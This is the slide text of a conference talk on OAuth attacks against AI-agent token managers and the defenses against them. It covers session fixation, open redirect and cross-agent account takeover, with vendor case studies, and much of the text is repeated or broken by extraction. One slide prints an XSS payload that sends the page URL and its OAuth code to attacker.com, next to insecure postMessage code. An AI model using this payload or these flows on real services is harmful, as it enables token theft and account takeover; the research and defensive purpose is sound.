authorization session
OAuth URL … Generate  state ,
② /authorize? state= state bound to  connection

#BHUSA  @BlackHatEvents

24

## Slide 54

## Session Fixation: Attack

OAuth Client Authoriza5on Server
Attacker ' s Victim ' s
Browser Browser Agent Backend Token Manager Tool
)
① Start OAuth
Generate  connection ,
attacker's session
bound to  attacker
authorization session
OAuth URL … Generate  state ,
② /authorize? state= state bound to  connection
Send OAuth URL
(②) to Victim
dropbox.com
/authorize

• Attacker initiates OAuth, **_fixating an authorization session_** to victim's Browser (by **sharing an OAuth URL** )

#BHUSA  @BlackHatEvents

24

## Slide 55

## Session Fixation: Attack

###### **OAuth Client**

###### **Authoriza5on Server**

•
Attacker initiates OAuth,
fixating an authorization
session  to victim's Browser Attacker ' s Victim ' s
Browser Browser Agent Backend Token Manager Tool
(by  sharing an OAuth URL )
① Start OAuth
• Generate  connection ,
Victim (unknowingly)
attacker's session
bound to  attacker
completes OAuth
authorization session
OAuth URL … Generate  state ,
② /authorize? state= state bound to  connection
Send OAuth URL
(②) to Victim
state= state
dropbox.com ② /authorize?
(Auto-)
/authorize
Authorize
&state= state
③ /callback?code= code
…

#BHUSA  @BlackHatEvents

24

## Slide 56

###### **5 Vulnerable Instances**

## Session Fixation: Attack

…

**Authorization Server**

###### **OAuth Client**

' s Victim ' s
Browser Agent Backend Token Manager Tool
① Start OAuth
Generate  connection ,
attacker's session
bound to  attacker
authorization session
… Generate  state ,
② /authorize? state= state bound to  connection
Send OAuth URL
(②) to Victim
state= state
dropbox.com ② /authorize?
(Auto-)
/authorize
Authorize
&state= state
③ /callback?code= code
…
Victim's  token  linked to
attacker's connection

• Attacker initiates OAuth, **_fixating an authorization session_** to victim's Browser **_Attacker '_** **_s Browser_** (by **sharing an OAuth URL** ) ① Start OAuth • Victim (unknowingly) **_attacker's session_** completes OAuth

**OAuth URL**

- Attacker gains **_access to victim's OAuth token_**

- ⇒ Lead to **_account takeover_** of the victim's tool !

#BHUSA  @BlackHatEvents

24

## Slide 57

## Session Fixation: Defense

Browser Agent Backend

OAuth Client
Token Manager

**Authoriza5on Server**

Tool

Authorize

…

#BHUSA  @BlackHatEvents

25

## Slide 58

## Session Fixation: Defense

###### **High-level idea**

- Verify: the user that **_initiates_** OAuth **==** the user that **_completes_** OAuth.

**_Browser_**

**_Agent Backend_**

OAuth Client

**_Token Manager_**

**Authorization Server**

**_Tool_**

Authorize

…

#BHUSA  @BlackHatEvents

25

## Slide 59

## Session Fixation: Defense

###### **High-level idea**

• Verify: the user that **_initiates_** OAuth **==** the user that **_completes_** OAuth.

OAuth Client

**_Browser Agent Backend Token Manager_** ① Start OAuth Generate **_connection_** , **_user session_** bound to **_user's identity_** … Generate **_state_** , **OAuth URL** bound to **_connection_** state= **_state_** ② /authorize?

**Authoriza5on Server**

Tool

Authorize

… #BHUSA  @BlackHatEvents

25

## Slide 60

## Session Fixation: Defense

###### **High-level idea**

• Verify: the user that **_initiates_** OAuth **==** the user that **_completes_** OAuth.

**OAuth Client**

**_Browser Agent Backend Token Manager_** ① Start OAuth Generate **_connection_** , **_user session_** bound to **_user's identity_** … Generate **_state_** , **OAuth URL** bound to **_connection_** state= **_state_** ② /authorize? **_Redirect_** ③ /callback?code= **_code_** &state= **_state Cannot verify user session_**

**_Redirect_**

**Authoriza5on Server**

**_Tool_**

Authorize

… #BHUSA  @BlackHatEvents

25

## Slide 61

## Session Fixation: Defense

OAuth Client Authoriza5on Server
Browser Agent Backend Token Manager Tool
① Start OAuth
Generate  connection ,
user session bound to  user's identity
… Generate  state ,
OAuth URL bound to  connection
state= state
② /authorize?
Authorize
Redirect ③ /callback?code= code &state= state
Cannot verify user session
Post-
Redirect

**Authoriza5on Server**

###### **High-level idea**

- Verify: the user that **_initiates_** OAuth **==** the user that **_completes_** OAuth.

###### **Fix strategy:** "Post-Redirect pa/ern"

- Token Manager **_additionally redirect_** to Agent Backend, asking for the active **_user id_** for verification.

… #BHUSA  @BlackHatEvents

25

## Slide 62

## Session Fixation: Defense

OAuth Client
Browser Agent Backend Token Manager
① Start OAuth
Generate  connection ,
user session bound to  user's identity
… Generate  state ,
OAuth URL bound to  connection
state= state
② /authorize?
Redirect ③ /callback?code= code &state= state
Cannot verify user session
Post-
Redirect
Verify  state  –
user session
user id  binding
user id

**Authoriza5on Server**

###### **High-level idea**

- Verify: the user that **_initiates_** OAuth **==** the user that **_completes_** OAuth.

Tool

###### **Fix strategy:** "Post-Redirect pa/ern"

- Token Manager **_additionally redirect_** to Agent Backend, asking for the active **_user id_** for verification.

Authorize

… #BHUSA  @BlackHatEvents

25

## Slide 63

## Session Fixation: Defense

###### **OAuth Client**

**Authoriza5on Server**

###### **High-level idea**

- Verify: the user that **_initiates_** OAuth **==** the user that **_completes_** OAuth.

**_Browser Agent Backend Token Manager_** **_Tool_** ① Start OAuth Generate **_connection_** , **_user session_** bound to **_user's identity_** … Generate **_state_** , **OAuth URL** bound to **_connection_** state= **_state_** ② /authorize? Authorize **_Redirect_** ③ /callback?code= **_code_** &state= **_state Cannot verify user session_** **_Defense Option#1 Post-_** /post_callback?code= **_code_** &state= **_state Redirect user session_** **_<code, state>_** Verify **_state_ –** **_user id_** binding **_user id + API KEY_**

###### **Fix strategy:** "Post-Redirect pa/ern"

- Token Manager **_additionally redirect_** to Agent Backend, asking for the active **_user id_** for verification.

Authorize

- 1) Agent Backend sets up _post-callback endpoint_

- 2) Token Manager redirects browser to this endpoint after initial _callback_

- 3) Agent Backend extracts **_user id_** from **_user session_** , submitting it along with credentials

- 4) Token Manager verifies binding between **_authorization session_** and **_user id_**

… #BHUSA  @BlackHatEvents

25

## Slide 64

## Session Fixation: Defense

###### **OAuth Client**

**Authorization Server**

###### **High-level idea**

- Verify: the user that **_initiates_** OAuth **==** the user that **_completes_** OAuth.

**_Browser Agent Backend Token Manager_** **_Tool_** ① Start OAuth Generate **_connection_** , **_user session_** bound to **_user's identity_** … Generate **_state_** , **OAuth URL** bound to **_connection_** state= **_state_** ② /authorize? Authorize **_Redirect_** ③ /callback?code= **_code_** &state= **_state Cannot verify user session_** **_Defense Option#1 Post-_** /post_callback?code= **_code_** &state= **_state Redirect user session_** **_<code, state>_** Verify **_state_ –** **_user id_** binding **_user id + API KEY_** **_Defense Option#2_** Generate **_nonce_** , bound to **_state_** /post_callback?nonce= **_nonce user session_** **_nonce_** Verify **_nonce_ –** **_user id_** binding **_user id + API KEY_**

###### **Fix strategy:** "Post-Redirect pattern"

- Token Manager **_additionally redirect_** to Agent Backend, asking for the active **_user id_** for verification.

Authorize

**_Redirect_**

- 1) Agent Backend sets up _post-callback endpoint_

- 2) Token Manager redirects browser to this endpoint after initial _callback_

- 3) Agent Backend extracts **_user id_** from **_user session_** , submitting it along with credentials

- 4) Token Manager verifies binding between **_authorization session_** and **_user id_**

… #BHUSA  @BlackHatEvents

25

## Slide 65

## Session Fixation: Defense

###### **OAuth Client**

**Authorization Server**

###### **High-level idea**

- Verify: the user that **_initiates_** OAuth **==** the user that **_completes_** OAuth.

**_Browser Agent Backend Token Manager_** **_Tool_** ① Start OAuth Generate **_connection_** , **_user session_** bound to **_user's identity_** … Generate **_state_** , **OAuth URL** bound to **_connection_** state= **_state_** ② /authorize?

###### **Fix strategy:** "Post-Redirect pattern"

- Token Manager **_additionally redirect_** to Agent Backend, asking for the active **_user id_** for verification.

Authorize

**_Redirect_** ③ /callback?code= **_code_** &state= **_state Cannot verify user session_** **_Defense Option#1 Post-_** /post_callback?code= **_code_** &state= **_state Redirect user session_** **_<code, state>_** Verify **_state_ –** **_user id_** binding **_user id + API KEY_** **_Defense Option#2_** Generate **_nonce_** , bound to **_state_** /post_callback?nonce= **_nonce user session_** **_nonce_** Verify **_nonce_ –** **_user id_** binding **_user id + API KEY_**

**_Redirect_**

- 1) Agent Backend sets up _post-callback endpoint_

- 2) Token Manager redirects browser to this endpoint after initial _callback_

- 3) Agent Backend extracts **_user id_** from **_user session_** , submitting it along with credentials

- 4) Token Manager verifies binding between **_authorization session_** and **_user id_**

Agent **_still_** needs to take up certain OAuth responsibilities for Security Purposes !

… #BHUSA  @BlackHatEvents

25

## Slide 66

## Session Fixation may also exist in MCP

Connection-based OAuth

Agent Token Manager Tool
OAuth Client Authoriza5on Server
OAuth URL
for a user
OAuth completed by a user
ß Gap à

MCP Downstream Tool Authorization
( e.g.,  out-of-band / URL elicitation,
Draft Proposal by )
Token Manager
MCP Client Tool
within MCP Server
OAuth Client Authoriza5on Server
OAuth URL
for a user
OAuth completed by a user
ß Gap à

Verify: the user that **_initiates_** OAuth == the user that **_completes_** OAuth

Arcade updated their MCP Proposal after our responsible disclosure

🔍 **elicitation.mdx > Security Considerations > URL Mode Security > Phishing** <u>https://github.com/modelcontextprotocol/modelcontextprotocol/pull/887/files?short_path=f2 70d43#diff-f270d43e0167b99f433086ab9fd986ae08905b57751401badeb6217b1ae2ee63</u>

#BHUSA  @BlackHatEvents

26

## Slide 67

On intricacies of Session Fixation Defense Heterogeneous Channels for Publishing Agents **Microsoft Copilot Studio**

- **Regular channels:** Web app, Native app

- • **Instant Messaging (IM) app channels:** Slack, Telegram, Facebook Messenger, Discord, …

in Facebook
in Website
Messenger

#BHUSA  @BlackHatEvents

27

## Slide 68

On intricacies of Session Fixation Defense Post-Redirect pattern is NOT universally applicable

Connec&on

#BHUSA  @BlackHatEvents

28

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ae
blesses On intricacies of Session Fixation Defense
Post-Redirect pattern is NOT universally applicable
Tool
Token Manager
Agent
O
(| D
Backend (eL2) .
Components ; Connection
user_id
(Servers)
```

## Slide 69

On intricacies of Session Fixation Defense Post-Redirect pattern is NOT universally applicable

So far, we assumed that **the** **_Browser_ is the** **_only User-agent_** used to contact each Backend entity … **Reality:** `o` Tool ✅ `o` ✅ Token Manager `o` Platform ✅ / Agent **_Frontend Components_** _(User-agents)_

Connec&on

#BHUSA  @BlackHatEvents

28

## Slide 70

On intricacies of Session Fixation Defense Post-Redirect pattern is NOT universally applicable

So far, we assumed that **the** **_Browser_ is the** **_only User-agent_** used to contact each Backend entity …

**Reality:** `o` Tool ✅ `o` ✅ Token Manager `o` Platform ✅ / Agent **_Channel_**

**_Frontend Components_** _(User-agents)_

Connec&on

user
session

#BHUSA  @BlackHatEvents

28

## Slide 71

On intricacies of Session Fixation Defense Post-Redirect pattern is NOT universally applicable

So far, we assumed that **the** **_Browser_ is the** **_only User-agent_** used to contact each Backend entity … **Reality:** `o` Tool ✅ `o` ✅ **_Connection_** Token Manager `o` Platform ✅ / Agent **_Post-Redirect Channel_** _user_ ❌ _session_ **_Frontend Components_** • Redirect to **IM app** is **_easy_** (via deeplink). _(User-agents)_

• Redirect to **IM app** is **_easy_** (via deeplink). • Redirect to **in-app Agent** is **_hard_** !

#BHUSA  @BlackHatEvents

28

## Slide 72

## On intricacies of Session Fixation Defense Solution: Learn from Cross-device OAuth Flows

**Instant Messaging (IM) app Channels** Constrained User-agent with limited **_callback_** capabilities

**Cross-Device OAuth Flows** Constrained Device with limited **_input_** capabilities

**_Post-redirect_**

❌

- **Solution#1: Directly use Cross-device Flows** [ Limited Adoption! ] e.g., OAuth Device Authorization Grant Client Initiated Backchannel Authentication (CIBA)

- **Solution#2: Retrofitting Auth Session Transfer to Authorization Code Grant** e.g., User manually passes PIN code for user identity check

#BHUSA  @BlackHatEvents

29

## Slide 73

## On intricacies of Session Fixation Defense Example: Copilot Studio / Azure AI Bot Service

🤔

- **Regular Channels:** (e.g., web app)

- Support post-redirect pattern (auto-verify session binding)

- • **Others Channels:** (e.g., in Instant Messaging apps) `o` **Manually enter** **_PIN codes_ to bridge the session gap**

- `o` Agent needs to provide an interface

- `o` Token Manager verifies the PIN

- **Complementary (Weaker) Defense:** `o` Extra Consent Screen at Token Manager's /callback

- **Long-term Goal ("Unphishable"):** `o` Equip each IM app channel with **_callback_** capabilities

###### **Copy/Paste PIN**

#BHUSA  @BlackHatEvents

30

## Slide 74

## Attack Type 2 – Open Redirect

###### **_Tool_**

###### **_Connection = <tool, agent, user>_**

Token Manager
Agent
Connec&on
User

###### **Expectation (End-user's Perspective):**

`o` **_My_** authorization for an agent should not go to another **_user_** served by the same agent.

**Reality:**

`o` **Cross-user Open Redirect**

#BHUSA  @BlackHatEvents

31

## Slide 75

## Attack Type 2 – Open Redirect

###### **_Tool_**

###### **_Connection = <tool, agent, user>_**

Token Manager
Agent
Connec&on
User

###### **Expectation (End-user's Perspective):**

o
My  authorization for an agent should not go to another  user
served by the same agent.
①website.com
?redirect=attacker.com
②Visit website
Reality:
o Cross-user Open Redirect Attacker Victim
31 ③Visit a=acker.com #BHUSA  @BlackHatEvents

31

## Slide 76

## Open Redirect: Attack When Session Fixation Defense Goes Wrong

OAuth Client Authoriza5on Server
Browser Agent Backend Token Manager Tool
① Start OAuth
…
② /authorize
② /authorize
(Auto-)
Authorize
Redirect ③ /callback
…

#BHUSA  @BlackHatEvents

32

## Slide 77

## Open Redirect: Attack When Session Fixation Defense Goes Wrong

OAuth Client Authorization Server
Browser Agent Backend Token Manager Tool
① Start OAuth
post-redirect= /post_callback
…
② /authorize
② /authorize
(Auto-)
Authorize
Redirect ③ /callback
…
Post-
Redirect

#BHUSA  @BlackHatEvents

32

## Slide 78

## Open Redirect: Attack When Session Fixation Defense Goes Wrong

OAuth Client Authoriza5on Server

•
Attacker initiates OAuth,
pointing  post-redirect  to an
attacker-controlled location Attacker ' s Victim ' s
Browser Browser Agent Backend Token Manager Tool
① Start OAuth
post-redirect= /post_callback
…
② /authorize
② /authorize
(Auto-)
Authorize
Redirect ③ /callback
…
Post-
Redirect

#BHUSA  @BlackHatEvents

32

## Slide 79

## Open Redirect: Attack When Session Fixation Defense Goes Wrong

• Attacker initiates OAuth, pointing **post-redirect** to an **_attacker-controlled location_**

OAuth Client Authorization Server

Attacker ' s Victim ' s
Browser Browser Agent Backend Token Manager Tool
① Start OAuth
post-redirect= /post_callback ->  /attacker
…
② /authorize
② /authorize
(Auto-)
Authorize
Redirect ③ /callback
…
Post-
Redirect

**_Attacker '_** **_s Browser_**

#BHUSA  @BlackHatEvents

32

## Slide 80

## Open Redirect: Attack When Session Fixation Defense Goes Wrong

OAuth Client Authoriza5on Server
•
Attacker initiates OAuth,
pointing  post-redirect  to an
attacker-controlled location Attacker ' s Victim ' s
Browser Browser Agent Backend Token Manager Tool
•
Attacker  sends the OAuth
① Start OAuth
authorization link  to victim
post-redirect= /post_callback ->  /attacker
…
② /authorize
Send ② to Victim
② /authorize
(Auto-)
Authorize
Redirect ③ /callback
…
Post-
Redirect

#BHUSA  @BlackHatEvents

32

## Slide 81

## Open Redirect: Attack When Session Fixation Defense Goes Wrong

OAuth Client Authoriza5on Server

•
Attacker initiates OAuth,
pointing  post-redirect  to an
attacker-controlled location Attacker ' s Victim ' s
Browser Browser Agent Backend Token Manager Tool
•
Attacker  sends the OAuth
① Start OAuth
authorization link  to victim
post-redirect= /post_callback ->  /attacker
•
Victim (unknowingly)
…
completes OAuth, leaking ② /authorize
auth credentials to attacker
Send ② to Victim
② /authorize
(Auto-)
Authorize
Redirect ③ /callback
…
Post-
Redirect

#BHUSA  @BlackHatEvents

32

## Slide 82

## Open Redirect: Attack When Session Fixation Defense Goes Wrong

###### **OAuth Client Authorization Server**

Token Manager

- Attacker initiates OAuth, pointing **post-redirect** to an **_attacker-controlled location_** **_Attacker '_** **_s Browser_**

- • Attacker **sends the OAuth** ①

- **authorization link** to victim

- • Victim (unknowingly) completes OAuth, leaking ② auth credentials to attacker

' s Victim ' s
Browser Browser Agent Backend
① Start OAuth
post-redirect= /post_callback ->  /attacker
…
② /authorize
Send ② to Victim
② /authorize
Redirect ③ /callback
Post-
/attacker ?code= code
Redirect
A"acker

- ⇒ Lead to **_account takeover_** of the victim's tool !

Tool

(Auto-)
Authorize
…

#BHUSA  @BlackHatEvents

32

## Slide 83

## Case Study: Open Redirects in Microsoft

**2 Vulnerable Instances**

I. Open Redirect + XSS
Microsoft
Power Automate/Apps
Pl at f o rm / A ge n t
Backend
Post-
Redirect
make.powerapps.com/oauth/redirect
?code= code
ideas.powerapps.com/d365community/idea /<UUID>
?code= code
A"acker
attacker- XSS Payload:  <img src=x onerror="var i=new Image();
i.src='https:// attacker.com ?url='+encodeURIComponent
controlled
location (document.URL);">

###### **_II. Open Redirect + postMessage()_**

Azure
Logic Apps
Pl at f o rm / A ge n t
Post- Backend
Redirect
ema.hosting.portal.azure.net/ema/Content
/2.41028.1.6/Html/authredirectv2.html
?code= code
ema.hosting.portal.azure.net/ema/Content
/ 2.30410.1.3 /Html/authredirectv2.html
Attacker
?code= code
Vulnerable Cross-window Communication:
attacker-
var oauthValue = JSON.stringify(urlParams);
controlled
window.opener. postMessage (oauthValue, '*' );
location

- **Severity: Critical**

- **Security Impact: Elevation of Privilege**

- **Severity: Important**

- **Security Impact: Spoofing**

#BHUSA  @BlackHatEvents

33

## Slide 84

## Case Study: Open Redirects in Microsoft

**_Open Redirect + XSS Sample Impact:_ Microsoft Power Automate/Apps Steal Outlook Emails**

#BHUSA  @BlackHatEvents

34

## Slide 85

## Open Redirect: Defense

OAuth Authoriza*on
Client Server
Browser Agent Backend Token Manager Tool
① Start OAuth
/AddConnection
post-redirect= /post_callback
->  /attacker
post-redirect= /attacker
…
② /authorize?redirect_uri=/callback
Authorize
③ /callback?code= code …
/post_callback?code= code
…
/attacker ?code= code
A"acker

Redirect
Post-
Redirect

#BHUSA  @BlackHatEvents

35

## Slide 86

## Open Redirect: Defense

###### **Defense**

- Compare post-redirect URL at Token Manager w/ **_exact string matching_** (no wildcard !), or

**OAuth Authoriza*on Client Server** **_Token Manager_** **_Tool_**

**_Browser Agent Backend_** ① Start OAuth

① Start OAuth
/AddConnection
post-redirect= /post_callback
->  /attacker
post-redirect= /attacker
…
② /authorize?redirect_uri=/callback
Authorize
③ /callback?code= code …
Match pattern agent.com/*
-> Exact String match
✅ - agent.com/post_callback
✅
❌ - agent.com/attacker ❌
/post_callback?code= code
…
/attacker ?code= code
Attacker

**_Redirect PostRedirect_**

#BHUSA  @BlackHatEvents

35

## Slide 87

## Open Redirect: Defense

###### **Defense**

- Compare post-redirect URL at Token Manager w/ **_exact string matching_** (no wildcard !), or

**OAuth Authoriza*on Client Server** **_Token Manager_** **_Tool_**

**_Browser Agent Backend Token Manager_** ① Start OAuth **/AddConnection** post-redirect= **_/post_callback_** _->_ **_/attacker_** post-redirect= **_/attacker_** … ② /authorize?redirect_uri=/callback

Authorize

Redirect ③ /callback?code= code …
✅
❌
Post-
/post_callback?code= code
Redirect
…
/attacker ?code= code
A"acker

#BHUSA  @BlackHatEvents

35

## Slide 88

## Open Redirect: Defense

###### **Defense**

- Compare post-redirect URL at Token Manager w/ **_exact string matching_** (no wildcard !), or

- Do not expose (user-controllable) post-redirect URL to frontend

OAuth Authorization
Client Server
Browser Agent Backend Token Manager Tool
① Start OAuth
/AddConnection
…
② /authorize?redirect_uri=/callback
Authorize
Redirect ③ /callback?code= code …
✅
❌
Post-
/post_callback?code= code
Redirect
…
/attacker ?code= code
A"acker

#BHUSA  @BlackHatEvents

35

## Slide 89

## Open Redirect: Defense

OAuth Authoriza*on
Client Server
Defense
• Compare post-redirect URL at Browser Agent Backend Token Manager Tool
Token Manager w/  exact string
① Start OAuth
matching  (no wildcard !), or
/AddConnection
•
Do not expose (user-controllable)
post-redirect URL to frontend
…
② /authorize?redirect_uri=/callback
Reflection Authorize
Redirect ③ /callback?code= code …
•
redirect_uri  is the source of open
redirect attacks in traditional OAuth.
• ✅
"Post-redirect pattern"  (Session
❌
Fixation defense) opens up  new Post-
/post_callback?code= code
open redirect possibility! Redirect
…
/attacker ?code= code
A"acker

#BHUSA  @BlackHatEvents

35

## Slide 90

## Confused Deputy: A tale of two attacks

###### **_Tool_**

###### **_Connection = <tool, agent, user>_**

Token Manager
Agent
Connec&on
User

###### **Expectation (End-user's Perspective):**

**Reality:**

`o` My authorization for one **_agent_** should not go to another **_agent_** .

**Cross-agent Confused Deputy**

#BHUSA  @BlackHatEvents

36

## Slide 91

## Confused Deputy: A tale of two attacks

Tool

###### **_ConnecCon = <tool, agent, user>_**

Token Manager
Agent
Connection
User

###### **Expectation (End-user's Perspective):**

**Reality:**

- My authorization for one **_agent_** should not go to another **_agent_** .

- `o` My authorization at one **_tool_** should not go to another **_tool_** .

**Cross-agent Confused Deputy**

**Cross-agent Cross-tool Confused Deputy**

#BHUSA  @BlackHatEvents

36

## Slide 92

## Confused Deputy: Background

###### **OAuth Registration**

- OAuth Client pre-register at Authorization Server

- **_Client ID_ :** unique identifier of an **_OAuth client_** , issued by authorization server

OAuth Authoriza2on
Client Server
Agent Backend Tool
Registration
<client_id= client , client_secret=***>
OAuth
/authorize?client_id= client  &…
Authorize
(via Browser)

Traditional OAuth: Each **_Client ID_** used only in **_one agent_**

#BHUSA  @BlackHatEvents

37

## Slide 93

## Confused Deputy: Background

###### **OAuth Registration**

###### **Common Design for OAuth-as-a-Service**

- OAuth Client pre-register at Authorization Server

- **_Client ID_ :** unique identifier of an **_OAuth client_** , issued by authorization server

- Provides **_pre-built integrations_** for popular tools (e.g., Dropbox, Outlook, GitHub)

- Handles OAuth (pre-)registration as well, with client_id & client_secret baked in

OAuth Authoriza2on
Client Server
Agent Backend Tool
Registration
<client_id= client , client_secret=***>
OAuth
/authorize?client_id= client  &…
Authorize
(via Browser)

⇒
Offers out-of-the-box tool support for custom agents
OAuth Authorization
Client Server
Token Manager Tool
Registra*on <client_id= client , client_secret=***>
/authorize?client_id= client  &…
OAuth Authorize
(via Browser)
/authorize?client_id= client  &…
OAuth Authorize
(via Browser)

Traditional OAuth: Each **_Client ID_** used only in **_one agent_**

OAuth-as-a-Service: Each **_Client ID_** shared by **_multiple agents_**

#BHUSA  @BlackHatEvents

37

## Slide 94

## Confused Deputy: Attack & Defense Attack Type 3 – Cross-agent Client ID Confusion

OAuth Authoriza2on
Client Server
Token Manager Tool
Registra*on <client_id= client , client_secret=***>

###### **Attack:**

- End-user consents at a pre-built tool for one agent

- Access granted w/o consent to an attacker-controlled agent

#BHUSA  @BlackHatEvents

38

## Slide 95

## Confused Deputy: Attack & Defense Attack Type 3 – Cross-agent Client ID Confusion

OAuth Authoriza2on
Client Server
Token Manager Tool
Registra*on <client_id= client , client_secret=***>
/authorize?client_id= client  &… Explicitly
OAuth
Authorize
…

###### **Attack:**

- End-user consents at a pre-built tool for one agent

- Access granted w/o consent to an attacker-controlled agent

#BHUSA  @BlackHatEvents

38

## Slide 96

## Confused Deputy: Attack & Defense Attack Type 3 – Cross-agent Client ID Confusion

OAuth Authorization
Client Server
Token Manager Tool
Registra*on <client_id= client , client_secret=***>
/authorize?client_id= client  &… Explicitly
OAuth
Authorize
…
/authorize?client_id= client  &… Auto-Authorize
OAuth
… w/ prior consent

###### **Attack:**

- End-user consents at a pre-built tool for one agent

- Access granted w/o consent to an attacker-controlled agent

#BHUSA  @BlackHatEvents

38

## Slide 97

## Confused Deputy: Attack & Defense Attack Type 3 – Cross-agent Client ID Confusion

OAuth Authoriza2on
Client Server
OAuth Authoriza2on
Client Server
Token Manager Tool
Token Manager Tool
Registration <client_id= agent1 , client_secret=***>
Registra*on <client_id= client , client_secret=***>
/authorize?client_id= agent1  &…
OAuth Authorize
/authorize?client_id= client  &… Explicitly
OAuth
Authorize
…
Registration <client_id= agent2 , client_secret=***>
/authorize?client_id= client  &… Auto-Authorize
OAuth … w/ prior consent /authorize?client_id= agent2  &… Authorize
OAuth

###### **Attack:**

###### **Defense:**

- End-user consents at a pre-built tool for one agent

- Access granted w/o consent to an attacker-controlled agent

- Only use shared client_id in 1<sup>st</sup> -party platforms or agents

- • Otherwise, **Always BYO** (Bring Your Own client_id) ! `o` Register **per-agent** , not per-Token Manager client_id

#BHUSA  @BlackHatEvents

38

## Slide 98

## Confused Deputy: Background

Cross-app/tool OAuth Account Takeover (COAT) **_Tools Integration Platform Tools_**

**_Integration Platform_**

_(a.k.a. integrated_ **_apps_** _/integrations)_

_(a.k.a. integrated_ **_apps_** _/integrations)_

OAuth Client Attacker Authoriza2on Server
attacker.com /authorize dropbox.com /authorize
attacker.com /token
with  code
/callback?code=code

Security
boundary
Microsoft
Power Automate
auth code
auth code

- **Attacker:** infiltrates via malicious tool

- **Assumption:** platform w/ open marketplace

- **Target:** a benign tool in the platform

- ⇒ **Impact:** victim's tokens leaked to attacker

###### **BHUSA '24 & USENIX Security '25**

- **_Real-world exploit_** against Multiple integrated apps / integrations in a platform

- _e.g.,_ Steal Outlook emails / Azure secrets w/o explicit consent (CVE-2023-36019, CVSS: 9.6)

[BHUSA '24] Kaixuan Luo et al. One Hack to Rule Them All: Pervasive Account Takeovers in Integrabon Placorms for Workflow Automabon, Virtual Voice Assistant, IoT, & LLM Services. heps://www.youtube.com/watch?v=qrHEBElig3c

39

[USENIX Security '25] Kaixuan Luo et al. Universal Cross-app Attacks: Exploiting and Securing OAuth 2.0 in Integration Platforms. <u>https://www.usenix.org/conference/ usenixsecurity25/presentation/luo-kaixuan</u> #BHUSA  @BlackHatEvents

#BHUSA  @BlackHatEvents

## Slide 99

**6 Vulnerable Instances**

## Confused Deputy: Attack Attack Type 4 – Cross-agent COAT

Microsoft …
Copilot Studio

[BHUSA '24] Cross-app/tool OAuth Account Takeover (COAT)

⭐

[NEW] Cross-agent COAT in Connection-based OAuth

###### **_Integration Platform_**

**_Tools_**

**_Agent Token Manager_**

**_Tools_**

Security
boundary
Microsoft
Power Automate
auth code
auth code

auth code
auth code

- **Attacker:** infiltrates via malicious tool

- **Assumption:** platform w/ open marketplace

- • **Target:** a benign tool in the same platform

- **Attacker:** infiltrates via malicious agent, can register malicious tools **_by design_**

- • **Target:** _any_ tool in _any_ agent

#BHUSA  @BlackHatEvents

40

## Slide 100

Case Study: Confused Deputy in Copilot Studio Attack Type 4 – Cross-agent COAT

Victim's Copilot

Attacker's Copilot

Token Manager
(Bot Framework
Token Service)

Agent
(Copilot)

Identity Providers

Token Service)
auth code

auth code

**Copilot Studio supports OAuth for** **_authenticating users_ at Identity Providers as well as authorizing users' tool access**

#BHUSA  @BlackHatEvents

41

## Slide 101

Case Study: Confused Deputy in Copilot Studio Attack Type 4 – Cross-agent COAT

Victim's Copilot

BLOCKED
❌
Attacker  cannot  login to Victim's Copilot,
Since it's configured with
Single-tenant (Victim's tenant) in Entra ID

BLOCKED
❌

#BHUSA  @BlackHatEvents

42

## Slide 102

Case Study: Confused Deputy in Copilot Studio Attack Type 4 – Cross-agent COAT

###### **_Attacker's Copilot_**

###### **_/authorize_**

a"acker's domain

###### **_/token_**

attacker's domain

Attacker configures their own Copilot, preparing **malicious endpoints** for the attack

#BHUSA  @BlackHatEvents

43

## Slide 103

Case Study: Confused Deputy in Copilot Studio Attack Type 4 – Cross-agent COAT

###### **_Attacker's Copilot_**

Attacker embeds **OAuth URL** of _Attacker's Copilot_ for social engineering

Victim gets tricked to make a **click**

#BHUSA  @BlackHatEvents

44

## Slide 104

### Case Study: Confused Deputy in Copilot Studio Attack Type 4 – Cross-agent COAT

###### **_/token_**

###### **_Victim's auth code_** for _Victim's Copilot_ leaked to **_Attacker_**

#BHUSA  @BlackHatEvents

45

## Slide 105

### Case Study: Confused Deputy in Copilot Studio Attack Type 4 – Cross-agent COAT

###### **_/token_**

###### **_Victim's auth code_** for _Victim's Copilot_ leaked to **_Attacker_**

Attacker redeems the **_stolen auth code_** for a **_token_**

#BHUSA  @BlackHatEvents

45

## Slide 106

### Case Study: Confused Deputy in Copilot Studio Attack Type 4 – Cross-agent COAT

**_Victim's Copilot_**

###### **_/token_**

###### **_Victim's auth code_** for _Victim's Copilot_ leaked to **_Attacker_**

Attacker redeems the **_stolen auth code_** for a **_token_**

Attacker logged in to _Victim's Copilot_ **_under Victim's identity_**

#BHUSA  @BlackHatEvents

45

## Slide 107

### Case Study: Confused Deputy in Copilot Studio

#### Attack Type 4 – Cross-agent COAT

With 1-click on a hyperlink:

- Cross-agent Cross-tool Account Takeover

• **Severity: Important** • **Security Impact: Spoofing + Meeting w/ Engineering Team**

- (-Copilot) (-tenant)

Once authenticated as the victim:

- Attacker can enjoy access to **_all data_** in _Victim's Copilot_ , guarded by Copilot Studio's OAuth:

   - **_Identity_** , impersonation of the victim

   - **_Delegated Permissions_** , assigned via victim’s Entra ID

   - **_Knowledge Sources_** , configured to ground victim’s agent

   - **_Actions & Tools_** , powered by Power Platform Connectors & Bot Framework skills

   - ... and more

#BHUSA  @BlackHatEvents

46

## Slide 108

## Confused Deputy: Defense Attack Type 4 – Cross-agent COAT

[BHUSA '24] Cross-app/tool OAuth Account Takeover (COAT)

⭐

[NEW] Cross-agent COAT in Connection-based OAuth

###### **_Integration Platform_**

###### **_Tools_**

###### **_Agent Token Manager_**

###### **_Tools_**

Security
boundary
Defense:
• Differentiate each tool with
distinct redirect_uri
auth code
auth code

- match tool ID at /callback

Defense:
auth code
auth code

- Differentiate each agent

- Within an agent, differentiate each tool

- Þ **_Globally-unique_** redirect_uri for each tool

- match tool ID at /callback

#BHUSA  @BlackHatEvents

47

## Slide 109

### Summary: Attacks in Connection-based OAuth

**_Tool_**

###### **_ConnecCon = <user, agent, tool>_**

Token Manager
Agent
User

#BHUSA  @BlackHatEvents

48

## Slide 110

### Summary: Attacks in Connection-based OAuth

###### **_Tool_**

###### **_ConnecCon = <user, agent, tool>_**

Token Manager
Agent
User
Session Fixation
① Cross-user
Improper Fix
② Cross-user Open Redirect

#BHUSA  @BlackHatEvents

48

## Slide 111

### Summary: Attacks in Connection-based OAuth

###### **_Tool_**

###### **_Connection = <user, agent, tool>_**

- ③ **Cross-agent Confused Deputy**

- Client ID Confusion

